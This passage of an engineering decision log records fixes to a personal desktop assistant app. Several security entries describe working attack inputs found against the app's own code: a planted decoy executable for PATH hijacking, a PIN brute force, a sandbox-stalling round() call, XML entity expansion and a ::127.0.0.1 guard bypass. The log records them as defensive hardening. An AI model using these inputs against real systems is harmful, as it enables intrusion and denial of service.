  fallback (which would reverse decision (3)) or only skipping the working
  folder (which leaves the batch-file route). Every common installer (pip,
  winget, scoop, choco) puts these three on PATH as an `.exe`, so the owner's
  own install still runs. The same walk found `record` hashing the file a
  second time to write the entry, after yt-dlp had run, so a file changed in
  between would be recorded as vouched for. The entry now holds the hash
  that was checked, and the changed file is refused at its next resolve.
  *(2026-11-17.)*
- **Sphynx tells you to use a PIN you use nowhere else, and its test PINs
  stay outside the fixture guard (the V0.03 walkthrough's S04; the owner's
  two calls).** Cerberus v2 made Cerberus's PIN a child lock that decrypts
  nothing, and Sphynx's docstring, unchanged since July, never said where
  its own PIN stands. It now does: a separate PIN, file and attempt counter,
  neither PIN decrypts anything, and the gate guards only `Felhaven.bat`'s
  launch. What the gate can still give away is the PIN itself.
  (1) **The advice goes where the PIN is chosen** (over SETUP alone): one
  line on the first-run screen, and the same in SETUP §7, where Cerberus
  already had it. The PIN is a fast, unsalted SHA-256, and Python tried
  every six-digit PIN in 1.2 s (measured), so anyone who can read
  `sphynx_data.json` (a backup, a synced folder, Cerberus's Custody editor)
  has it. That costs nothing unless the PIN is also a phone or card PIN.
  Key stretching stays out, as the docstring says: whoever can read the file
  can edit it to skip the gate, so a slow hash would protect only a reused
  PIN, and the advice covers that.
  (2) **`test_secret_fixtures` still scans only tests that import
  Cerberus.** Sphynx's tests use bare-digit PINs; none of them, in any
  version of the two files, is the real one (checked by hash). The owner
  kept the guard to the vault's tests, since the gate guards nothing
  secret. *(2026-11-17.)*
- **Every program Felhaven starts is named by its absolute path (the V0.03
  walkthrough's S05; carries Brontes's decision (2), 2026-11-09, from DLLs
  to programs).** Aether's WiFi probe and Argus's firewall and DNS reads ran
  `netsh` and `ipconfig` by bare name, and Daedalus ran `notepad.exe` the
  same way. For a bare name, Windows searches Python's own folder and the
  working folder before System32, unless `NoDefaultCurrentDirectoryInExePath`
  is set, and the owner's machine doesn't set it. Measured: with a copy of
  `hostname.exe` named `netsh.exe` in the working folder, Aether's call ran
  it. Felhaven.bat and Sphynx start Felhaven in the app folder, which is
  why the launch guard's verdicts (2026-10-03) judged a planted file there
  no worse than editing the code. But `python felhaven.py` can be started
  from any folder (SETUP §7 offers running it directly), and then that
  folder is the one searched.
  (1) **System32 by `%SystemRoot%`, in each module** (Brontes's `nvml.dll`
  rule). Argus and Daedalus belong to later walkthrough sessions, but a
  security fix lands in the session that finds it. A shared helper was
  left out: four one-line constants, and no module's job is "where
  Windows keeps its programs".
  (2) **A guard, the owner's pick** (over the fix alone):
  `test_process_launches` fails any subprocess launch whose program is a
  constant that isn't an absolute path, read through a module-level
  constant too. Only macOS's `open` and Linux's `xdg-open` are allowed,
  where exec searches PATH and never the working folder. A computed program
  (Aegis's bin/ paths, `sys.executable`) is outside it and stays with its
  `_LAUNCHES` line.
  A scar for whoever measures this next: Claude Code's own shell sets
  `NoDefaultCurrentDirectoryInExePath`, so the first decoy run came back
  clean. Unset it before measuring. *(2026-11-17.)*
- **Iris's warning popup stands alone, and its alerts carry only what a
  display reads (the V0.03 walkthrough's S06; the owner's two calls).**
  (1) **The popup is no longer `transient` to the main window** (over
  bringing Felhaven back up with it, or leaving it). Windows hides a window
  tied to a minimised one: measured, a tied popup opened withdrawn while
  its main window was minimised and showed only once that came back. With
  Read aloud off, a warning arriving then gave no sign at all. Untied, it
  shows on top with a taskbar button of its own, centred on the screen
  while Felhaven is minimised, and stays up until acknowledged even if
  Felhaven is minimised after it opened. Untying it only while the main
  window is minimised doesn't work: Tk can't bring back a popup Windows has
  already hidden (measured: untied and deiconified, it stayed unmapped).
  This departs from Ammit's popup shape (2026-09-14), which has the same
  gap (BACKLOG, S28).
  (2) **`onset`, `sender`, `area` and `headline` left Iris's alert dict**
  (over keeping them for a future warnings brain tool): no display read
  them, and adding one back is a line. Iris still reads the Weather
  Service's headline as the summary's last resort. *(2026-11-17.)*
- **Eos's reading carries only what a display reads (the V0.03
  walkthrough's S07; the owner's call).** `kp_kind`, `kp_time` and each
  day's `r_major`, `s` and `kp_max` left `eos.fetch()`'s dict (over keeping
  them for a future aurora brain tool, BACKLOG): NOW, Celestarium and Home
  read none of them, and adding one back is a line. It is Iris's call
  (above) again, so the two polled modules born together on 2026-11-10
  keep one rule. `kp` is still the bin that holds the present moment,
  whatever its kind. *(2026-11-17.)*
- **A keyed request's reply is cut free of its key before any of it is
  logged (`tools/demeter.py`; the V0.03 walkthrough's S10).** Demeter logs
  the first 200 bytes of an elevation reply it can't parse, because the API
  reports quota and auth trouble as a short body. Measured with a made-up
  key, OpenTopography's error reply repeats the key it was sent ("Not a
  valid format API Key: <key>"). That one came as a 401, which never
  reaches the parse, but one that comes as a 200 would have written the key
  into `logs/` in plain text (none had: the logs on disk were checked).
  Now the key is replaced, in any case, in the reply's bytes before the
  200-byte cut (so a key across the cut leaves no head behind) and in the
  slug, and `from None` keeps the unredacted error out of any traceback.
  The rule for any keyed tool: §2 already keeps an exception's text out of
  a log; a reply's text is the server's, and it can quote the request, so
  it is never logged with the key still in it. Midas logs only a class and
  a status; Callimachus's catch-all logs a raw message (BACKLOG, S33).
  *(2026-11-18.)*
- **A mistyped coordinate never leaves the machine (`tools/eratosthenes.py`;
  the V0.03 walkthrough's S11).** Coordinates and waypoints resolve
  offline, but text that only looks like coordinates and fails to parse
  (one hemisphere letter, a lone latitude, minutes past 60) fell through to
  the Census geocoder, sending a location to census.gov. Measured live with
  public points, it came back as "no match" or as a guess:
  "138.8977 -77.0365", a latitude with one digit too many, was echoed back
  as an x/y pair at 77°S, which the chart would have panned to under the
  label ", , , ". Text made only of numbers and hemisphere letters that
  didn't parse is now `bad_coordinates`, and the panel says so in words.
  Two placements are deliberate. The refusal comes after the waypoints, so
  a waypoint named in digits still resolves. It also comes before the
  geocoder, not inside it, so the rule is "a word makes it an address".
  The cost, measured: the geocoder can match some number-only addresses
  ("100 N 200 E 84601", a Utah grid address, returned a different corner
  of the same town), and such an address now needs its city typed. The
  owner's call over leaving it as it was (2026-11-18), taken on the claim
  that numbers alone can't match; the live check above showed they can,
  only as a guess. *(2026-11-18.)*
- **Clio's QC checks the true peak as well as the loudness (the V0.03
  walkthrough's S16; the owner's pick).** Clio's Audio section promised
  peaks under -1.5 dBTP, and `TARGET_TP` named the figure, but QC measured
  only the loudness and the final hold: the limiter at -2 dBFS was trusted
  to keep the promise. Measured on all eleven finished videos, it does, at
  -1.77 to -1.86 dBTP, so 0.27 dB to spare. Checking costs nothing, since
  loudnorm's measuring pass already reports the peak. A video over the line
  now fails like a loudness miss: exit 1, renamed `.failed-qc.mp4`. The
  other choice was to reword the figure as the limiter's aim, unchecked; but
  a run that fails rather than warns shouldn't promise a number it never
  measures. *(2026-11-19.)*
- **Tool results reach the model as real characters (`pythia.py`; the
  V0.03 walkthrough's S17; the owner's pick).** Pythia wrote each tool
  result with `json.dumps(result)`, whose default escapes every non-ASCII
  character, so a curly quote reached the model as the six characters
  `\u2019`: the request's own JSON then carries the backslash through, and
  Ollama hands it to the model as written. Measured on gemma4:e2b with six
  news-style headlines: 427 prompt tokens escaped, 344 as characters. Asked
  to quote them exactly, the model turned curly double quotes into single
  ones and em dashes into en dashes; with the characters, all six came back
  exact. Now `ensure_ascii=False`, for the model's copy and for the Rite
  records' (the Rite Log showed the escapes too). The result is still JSON,
  and the request body is escaped on the wire as before, so nothing else
  moves. The routing probe ran on this branch and on master the same
  evening: 49/56 each, the same verdict on every row (rows 12 and 16 miss
  as always, row 23 once, and row 4 on both; BACKLOG). *(2026-11-19.)*
- **Log lines keep an exception's text, and Pythia's tool catch-all scrubs
  credential values out of it (`pythia.py`; the V0.03 walkthrough's S17;
  the owner's pick).** The July walkthrough left a flag: the output guard
  reads `{"error": …}` returns, not log calls, and a log line that printed
  an exception's text is how Midas once wrote its Finnhub key into
  `logs/`. On this date, 102 log calls in 30 files printed a caught
  exception's text.
  No live leak was found: hermes's errors carry fixed text and no URL since
  S01, Midas logs a class and a status, and Callimachus's Brave key rides
  in a header (its catch-all is still a BACKLOG item for S33). A guard over
  all 102 would be an allowlist of nearly every one, so there is none. The
  one line that any exception escaping a tool reaches, `_dispatch`'s
  catch-all, now passes the text through `_redact()`, the
  Rite Log's scrub (`key=`, `token=` and `auth=` values, a Bearer header).
  The text stays, because it is what diagnoses a tool bug. *(2026-11-19.)*
- **Golden hour follows the sun's angle (`tools/helios.py`; the V0.03
  walkthrough's S21; the owner's pick, closing the BACKLOG decision of
  2026-09-28).** It was a plain hour after sunrise and before sunset, kept
  when Helios learned the sun's position because switching would change what
  the row meant. Now it means what photography almanacs mean: the sun's
  centre between 4° below the horizon and 6° above it, true (airless)
  altitude. At mid-latitudes the plain hour began 15 to 28 minutes late in
  the morning, and in the evening ended that much early, in every season
  checked (Washington DC, Greenwich, New York, Sydney). (1) **The same
  hour-angle solution as sunrise**, at -4° and +6°, so no new astronomy.
  Checked against JPL Horizons' airless elevations at five places on seven
  days: 23 of 24 crossings to the minute, and Sydney's evening +6° a minute
  off. (2) **Above about 60°, near a solstice, an end may not happen.** If
  the sun never climbs to +6°, the morning window ends and the evening one
  starts at solar noon (Anchorage at midwinter is golden all day). If it
  never sinks to -4°, they meet at solar midnight (Trondheim at midsummer).
  The windows meet rather than show "—", because the light is golden through
  that span. (3) **No refraction.** Below the horizon there is none to see;
  at +6° it moves the end by about a minute at mid-latitudes; and the
  reference the tests use leaves it out. (4) **The tool schema is
  unchanged**, so routing cannot move and no probe ran. get_sky_report's
  `golden_am` and `golden_pm` move by those minutes. The Virgil tooltip,
  which said Felhaven counts a plain hour, now gives the angle.
  *(2026-11-20.)*
- **Argus says when Windows keeps the DNS cache from a normal user
  (`tools/argus.py`, `panels/argus_panel.py`; the V0.03 walkthrough's S22;
  the owner's pick).** Measured 2026-11-21 on Windows 11 (build 26200) as a
  normal user: `ipconfig /displaydns` exits 1 with "The requested operation
  requires elevation", the DNS API's own cache table refuses too, and
  PowerShell's `Get-DnsClientCache` returns nothing, while the DNS Client
  service runs. Argus read every refusal as a failure, so the DNS CACHE
  section blamed a stopped service, the summary dot stayed amber for good,
  and Pythia was told the cache held 0 names. (1) **A refusal is its own
  state, `needs_admin`,** recognised by ipconfig's English sentence, like
  Argus's two parsers; any other failure stays `unavailable`. (2) **The dot
  counts it as a permission, not a failure,** so it stays teal; amber keeps
  meaning a source failed or a program went unnamed. The section says
  Windows shows the cache only to an administrator. (3) **`handle()` leaves
  `dns_cached_names` out unless the cache was read.** A count it couldn't
  take would be a false 0. (4) **Argus still never asks for elevation;** a
  Felhaven run as administrator shows the cache again. Removing the section
  was the other choice, and lost that run; fixing only the hint left the
  dot amber and the 0 in place. The routing probe ran before and after
  (default prompt, 2 runs): 49/56 on master, 48/56 on the branch, and the
  only rows that moved (23 and 24, one sample each) got a byte-identical
  request on both, captured, so the difference is sampling. *(2026-11-21.)*
- **Echo never replaces a file in `local_audio/`** (`tools/echo.py`,
  `panels/echo_panel.py`; the V0.03 walkthrough's S23; the owner's pick).
  Echo handed ffmpeg `-y`, so a name already there was overwritten with no
  Recycle Bin copy. And when the encode failed, Echo removed the file at
  that name, though ffmpeg had never touched it: measured with the real
  ffmpeg, a kept file was gone after one failed encode. (1) **A name
  already there is refused (`file_exists`) before synthesis,** so a long
  document costs no minutes for nothing. The status line says to pick
  another name or remove the old file in ORPHEUS, which sends it to the
  Recycle Bin. (2) **The name is then claimed with an exclusive create
  (`O_EXCL`) just before ffmpeg runs.** A name taken during synthesis is
  refused too, and the file a failed encode removes is always the empty one
  Echo just made. Overwriting safely was the other choice: keep `-y` and
  remove only Echo's own file. It still lost the old file on every success,
  and Orpheus's duration cache assumed write-once files. That cache no
  longer leans on it either: it keys on name, size and mtime, because a
  probe of a file Echo was still writing cached a partial duration (46 s
  for a 24:37 file, measured). *(2026-11-21.)*
- **ORPHEUS decodes off the UI thread** (`panels/orpheus_panel.py`; the
  V0.03 walkthrough's S23; the owner's pick). `orpheus.play_file()` decodes
  the whole file before anything plays, and it ran in the click handler on
  the panel's word that it was "fast enough for what Echo produces". Echo
  has made longer files since: measured 2026-11-21 on the owner's files, a
  25-minute one took 3.2 s, a 19-minute one 2.3 s, a 9-minute one 1.1 s,
  and all of Felhaven froze for that long. The panel now takes EchoPanel's
  shape, which §6 already names: one daemon thread per click, whose only
  shared touch is a queue `put`, and a bounded `after()` chain that drains
  it and stops itself. A second click while one decodes is ignored, the
  status line says "decoding …", and the chain is cancelled in `destroy()`.
  Leaving it in BACKLOG, as S11 did with the Cartograph's search freeze, was
  the other choice; this one needed no new design. *(2026-11-21.)*
- **Themis reads and writes its file under one lock (`themis.py`; the V0.03
  walkthrough's S24).** Windows refuses `os.replace` onto a file another
  thread has open (WinError 5), and refuses an open while the rename runs
  (Errno 13). Themis is read on many threads (horai's worker every second,
  seven more workers, Pythia's request thread, the Tk thread's two clocks)
  and saved on the Tk thread. Measured with a tight reader against 300
  saves: 215 saves failed, and 78 reads fell back to the defaults
  (Greenwich, °F, the default model). At real rates it is rare (none in 300
  saves against a reader once a second), but a lost read fetches for the
  wrong place or asks the wrong model. One `threading.Lock` held across each
  read and each rename: 0 and 0. A lock rather than a retry, because both
  sides are in this one process. Other files saved with `os.replace` and read
  on another thread can race the same way (BACKLOG). *(2026-11-21.)*
- **A settings save logs field names, not values (`themis.py`; S24; the
  owner's pick).** `_write` logged the whole settings dict at INFO: the
  latitude, longitude, weather location and Atmospherics place id (which
  encodes a location too), and the EMANON tab shows INFO lines on screen.
  It now logs `settings saved (changed: latitude, longitude)`. A refused
  weather location's warning names its type, not its text. Keeping the
  values was the other choice: the log is local and gitignored.
  *(2026-11-21.)*
- **SCRIBE's task list scrolls (`panels/scribe_panel.py`; S24; the owner's
  pick).** At the 488 x 330 tab (Felhaven's 760 x 500 minimum), rows past
  about ten ran off the bottom and the notes shrank to nothing first; about
  fifteen fit at the start size. The list now sits in `theme.ScrollColumn`,
  as tall as its rows or as what is left once the notes keep four lines,
  and a task just added scrolls into view. BACKLOG was the other choice.
  *(2026-11-21.)*
- **Errors nothing caught go to the log (`felhaven.py`, `kairos.py`; the
  V0.03 walkthrough's S25).** Felhaven.bat starts the Sphynx gate under
  pythonw, and Sphynx spawns felhaven.py, so Felhaven has no stderr
  (`sys.stderr` is None, reproduced through that chain). Tk prints a
  callback's exception there, and Python a thread's, so both went nowhere:
  a probe through the chain found neither in `logs/`. That is why earlier
  sessions kept finding failures "silent under pythonw". Felhaven now
  installs `root.report_callback_exception` and `threading.excepthook`,
  which log at ERROR with the traceback; each distinct failure (class, file,
  line) is logged once a run, so a `<Motion>` handler that raises can't fill
  the log. The same probe then found both. Kairos guards each panel's
  `update()` itself, logging a panel when it starts failing and again when
  it recovers, and re-arms its tick in a `finally`: one raise used to freeze
  every panel, with no log line either (BACKLOG). A failure while Felhaven
  is built is logged at CRITICAL and, the owner's pick, shown in an error
  box naming only the error's kind, since no window would ever open.
  *(2026-11-21.)*
- **A failed SCRIBE save shows on the tab (`scribe.py`,
  `panels/scribe_panel.py`, `felhaven.py`; S25; the owner's pick, closing
  S24's BACKLOG item).** `save_data()` returns whether it wrote the file,
  `_flush_save` hands that to the tab, and its count line reads "3 open ·
  not saved, see the log" in red until a save works. Logging only was the
  other choice: EMANON already showed the WARNING, but nothing on the SCRIBE
  tab did, and the notes were lost at the next start. A save that fails
  while the window closes can only be logged. *(2026-11-21.)*
- **The error hooks live in `metis_logging` (the V0.03 walkthrough's S26,
  closing S25's BACKLOG item).** S25 put Felhaven's hooks in `felhaven.py`;
  the Sphynx gate, the other entry point and also under pythonw, never set up
  logging at all, so its errors still went nowhere. `setup_logging()` now
  installs `threading.excepthook` and `sys.excepthook` itself, and
  `log_tk_errors(root)` wires a Tk root, so each entry point makes two calls
  (§5). One function, `log_uncaught()`, does the logging and the once-a-run
  dedupe, which also keeps Felhaven's own start-failure line from being
  logged a second time by the program hook. The program hook passes the
  exception on to the one it replaced, so a console run still prints it. The
  gate calls both in its program block, not its constructor, so its smoke
  tests open no log. Through the real launch chain a probe found a Tk
  callback's, a thread's and the program's exception in the log. The console
  handler is now added only when there is a stderr: under pythonw it wrote to
  None, and every record failed inside it. *(2026-11-21.)*
- **EMANON shows every line's date (`panels/emanon_panel.py`; the V0.03
  walkthrough's S27; the owner's pick, closing his report of 2026-10-02,
  "Emanon's time looks wrong").** The panel showed the time alone ("the date
  is too wide"). The owner's log, read for timestamps only, had no clock
  jump and nothing out of order in early October; Felhaven ran on 2026-10-02
  from 06:01 to about 18:00 and restarted the next morning at 07:37, so the
  first view after a restart showed the evening before's times as if they
  were today's. Every line now carries "2026-10-02 16:42:13". A date only on
  lines from an earlier day was the recommendation, and keeping the time
  alone the other choice; the owner chose the date everywhere, unambiguous
  at the cost of earlier wrapping. The same session stopped the 2 s rebuild
  of an unchanged tail, which wiped a selection and threw a reader who had
  scrolled up back to the bottom. *(2026-11-21.)*
- **Horai has no logger, by a written exemption (the V0.03 walkthrough's
  S28; the owner's pick, closing the 2026-09-28 entry's open question).** It
  reads only the clock and Themis, has no failure of its own, and Themis logs
  its own file's problems, so a logger would be a name with nothing to say.
  `test_tool_loggers` holds it as an exemption with that reason, and still
  fails if Horai gains one. A logger with no calls, so every tool module
  looks the same, was the other choice. *(2026-11-21.)*
- **Ammit's alarm stays quiet for an expiry already dismissed, and follows
  the timer (`panels/horai_panel.py`; S28; the owner's pick).** The alarm
  ignored `acknowledged`: measured, a timer dismissed before a restart
  popped up and spoke at every launch until Stop or Reset, while the
  countdown and Home's badge read it green, which is the split the
  2026-09-14 rule forbids. Now only an expiry not yet seen fires, which
  still includes one that ran out while Felhaven was closed. Re-alarming at
  every launch, with the countdown and badge back to red to match, was the
  other choice. A stop, reset or restart now closes a popup still open:
  measured, one left open beside the next expiry's popup acknowledged that
  expiry when dismissed. The popup also stands alone now, as Iris's has
  since 2026-11-17 (BACKLOG): measured with the main window minimised, the
  tied popup stayed withdrawn, and the untied one showed, centred on the
  screen. *(2026-11-21.)*
- **Ammit reads and writes its file under one lock (`tools/ammit.py`; S28).**
  The Themis race again: Pythia's request thread starts, stops and resets
  the timer while the Tk thread reads it three times a second and saves its
  own clicks and the alarm's acknowledge. Measured unlocked with a tight
  reader, 149 of 300 saves failed and 84 reads fell back to "no timer"; with
  two writers, a load that fell back saved "no timer" over a running one 53
  times in 300. None at real rates (300 saves against three reads a second).
  The lock also covers each public call's whole read-change-save, so two
  threads can't each save over the other's change. Locked: 0, 0 and 0.
  *(2026-11-21.)*
- **Midas dates its answers (`tools/midas.py`; the V0.03 walkthrough's S29,
  closing the audit's T7).** It answers from a 60 s cache, and a ticker whose
  refresh failed rides back on its last good price, but it said neither
  when. Now every answer carries `as_of`, when that set was fetched, and a
  stale ticker its own, when its price is from: one date for the usual case,
  and the honest one for the exception. Aura's convention (naive local ISO,
  an injectable `_now()`); unlike Aura, the panel's dict carries it too,
  since the cache is shared and PRICES' "updated HH:MM" now reads it.
  gemma4:e2b ignores freshness fields (2026-09-28), so the gain is for the
  next model. The routing probe on the default prompt read 48/56 on branch
  and master alike (prefix 5,106 both): the watchlist row passed 2/2 on
  each, its answer 26 prompt tokens longer, and the rows that moved never
  call Midas. *(2026-11-22.)*
- **Midas never reuses a cached refusal, and opening the Dynastic Vault
  fetches at once (S29).** Measured: locked, then unlocked a second later,
  Midas answered `vault_locked` from its cache for up to 60 s with no network
  call, and the panel showed the tick it kept while sealed, "locked" on
  every row, until the next 60 s tick. `vault_locked` and `no_key` cost
  nothing to check again, so a set holding one is never reused; the gate
  calls `Kairos.refetch("midas")` (the Settings tab's seam), and a kept tick
  saying "locked" isn't shown. *(2026-11-22.)*
- **Plutus never writes over a ledger it can't read (`tools/plutus.py`;
  S29).** `add_event()` appended to `load_events()`, which reads an
  unreadable file as empty: measured, a ledger of 40 records with one
  hand-edit typo became a file of one record after one ADD. A real-money
  record wants the opposite of "carry on": `add_event()` reads strictly and
  raises `LedgerError`, LEDGER says so in red, and the file stays as it was
  for a human to mend. A record the folds can't read is skipped and counted
  on the totals line, not raised (it stopped the tab drawing) and not
  dropped (`add_event()` keeps it in the file). Shares and price must be
  finite: one NaN made its ticker fall out of the holdings for good, since
  NaN > 0 is false. Plutus is unused today, so no ledger was lost.
  *(2026-11-22.)*
- **A feed can't freeze Felhaven: Pheme bounds each story field and refuses a
  feed that declares an XML entity (`tools/pheme.py`; the V0.03
  walkthrough's S30, a security fix).** A feed is network input, and two
  things it could send were unbounded. (1) **Length.** A plain feed under the
  byte cap can carry a title of a million characters; measured, the
  Scriptorium took 137 s to draw one, frozen on the Tk thread, and handle()
  would have handed it to Pythia whole. Title, author and url now have caps,
  4x the longest measured over every item of the 7 shipped feeds and rounded
  up to a power of two (130, 54 and 176 characters: 512, 256, 1,024). A
  title or author past its cap is cut and ends in "…"; a url past its cap is
  dropped, because a cut url is a wrong link, and the story just isn't
  clickable. (2) **Entities.** expat 2.8.2 refuses a billion laughs, but
  lets one entity expand up to ~100x: measured, a 900 KB feed became a
  54,000,000-character title and 108 MB in 0.09 s. No feed needs an entity
  (none of the 7 has a DOCTYPE), so one that declares any is refused as
  `invalid_feed_xml`, the slug the panel already words. The check is
  pyexpat reading the prolog, where declarations must sit, not a byte
  search, which a UTF-16 feed would get past. *(2026-11-23.)*
- **Pheme's byte cap follows its rule up: 2 MiB (S30, the owner's pick).**
  The Register's feed grew from 244,346 B (2026-10-01) to 300,830 B, so
  1 MiB was 3.5x the largest feed against the rule's 4x. Raising it moves
  hermes's default deadline from 12 s to the cap at 100 kB/s, about 21 s, a
  wait only a link slower than that sees. Kept at 1 MiB, the feed would have
  read "too large" once it grew past it. *(2026-11-23.)*
- **Pheme checks its config row by row (S30).** §4 says a bad config
  degrades one panel, never the app, but a feed row with no id, a row that
  wasn't an object, or a `feeds` that wasn't a list stopped PhemePanel, and
  so Felhaven, from opening (measured). `load_feeds()` keeps the usable rows
  and logs the rest, Midas's watchlist rule (S29), and the panel reads
  through it instead of its own copy of the file. Rows with none usable
  count as unreadable, so handle()'s empty `stories` still means the feeds
  answered, not that every row was bad. *(2026-11-23.)*
- **Zeno's sandbox bounds what a call can cost, not only what it can name
  (`tools/zeno.py`; the V0.03 walkthrough's S31, a security fix).** The
  model writes Zeno's expressions, and a page Pythia reads can steer the
  model, so the whitelist is a boundary on time and size as well as on
  syntax. Two things got past it. (1) **round()'s hidden power.** For an int
  and a negative ndigits, `int.__round__` computes 10 to the minus ndigits,
  which `_guard_pow` never sees: `round(5, -100000000)` ran past 20 s
  (measured), holding Pythia's turn. Once that power is more than ten times
  the number the answer is exactly 0, so `_round()` returns it without the
  power; a number has at most `bit_length // 3 + 1` digits, hence the bound,
  and a test holds the shortcut to Python's own answers. The other
  whitelisted functions were checked for a power of their own; the math
  functions turn a huge int into a float and raise, and factorial and `**`
  were already guarded. (2) **The steps.** Each step restates the whole
  expression, so a wide call grew quadratically: `max()` of 100 factorials,
  1,703 characters, returned 19.3 MB in 1.2 s, and Pythia sends a tool
  result to the model whole. The steps now have fetch_page's budget, 4,000
  characters: the step that would pass it becomes "…", and no snapshot is
  built after it. `result` and `display` always carry the answer, and an
  ordinary trace is far under the budget. *(2026-11-23.)*
- **Herodotus's first rail covers list and search too, and stops at hard
  links (`tools/herodotus.py`; S32).** Rail 1 said every path resolves
  inside the archive "on every operation", but only read, write and edit
  went through `_resolve`; list and search walked the folder as it stood.
  Measured with a symlink to a file outside: read and edit refused it, list
  showed it, and search returned the outside file's text. Both now skip an
  entry that resolves elsewhere. A hard link is the file itself, so no path
  check can tell it apart, and read returns it like any document. Making
  either kind of link needs write access to the archive folder, and anyone
  with that can read the outside file directly, so the rails stop there
  rather than refusing every file with a second link. *(2026-11-23.)*
- **The address guard refuses ::/96 by its shape, not by Python's word for it
  (`tools/callimachus.py`; S33, a security fix).** `_is_public` leaned on
  `ipaddress`'s `is_global`, which counts ::/96, the IPv4-compatible form
  RFC 4291 deprecated, as global: `::127.0.0.1` passed as public. Measured on
  Windows, a connect to `::7f00:1` answers "unreachable network", so nothing
  was reached, but the guard's promise is the public internet and nothing
  else, and a resolver answer of that shape is no address anyone should
  dial. The check is on the bits (the top 96 zero), the same way the guard
  already looks inside IPv4-mapped, 6to4 and NAT64 addresses.
  *(2026-11-23.)*
- **fetch_page reads text only (S33).** It decoded whatever came back as
  UTF-8 and stripped it as HTML: measured live, a PDF and a PNG each came
  back as 4,000 characters of their bytes, about 1,700 of them replacement
  characters, and the model was handed them as the page. Now a Content-Type
  that isn't text, XML or JSON is refused as `unavailable: not a text page
  (<type>)` before the body is read, so the download is skipped too. A
  missing Content-Type is read as text, as a browser would sniff it, and the
  server's type is quoted only when it is shaped like one. *(2026-11-23.)*
- **play_music answers with the load's verdict (`tools/morpheus.py`; S35,
  the owner's pick).** loadfile is fire-and-forget, and play_music answered
  `now_playing` the moment it was written, so when YouTube then refused the
  stream Pythia had already said the song was playing; the owner's log held
  45 Morpheus errors from 2026-09-17 on, most of them that (counted by level
  and logger, the messages unread). Of the three ways offered, waiting for
  the verdict, answering at once and posting a correction into the chat
  later, or fixing only the immediate case, the owner picked the first. It
  polls status() every 0.5 s, the read control_music already makes, until
  media exists (`now_playing`), the load is condemned or mpv is gone
  (`unavailable`), a stop disarmed it (`not_playing`), or another play()
  replaced it (`now_playing`: ours did start). A load took 4.5-6.5 s to
  become audible (2026-09-19), so the wait is bounded at 15 s, past which the
  answer says `"loading": true`. The cost is that Pythia answers a "play X"
  a few seconds later; the gain is that she never claims a song that didn't
  load. play() also says whether it sent anything, so a refused URL or an
  mpv that won't start is `unavailable` at once. *(2026-11-23.)*
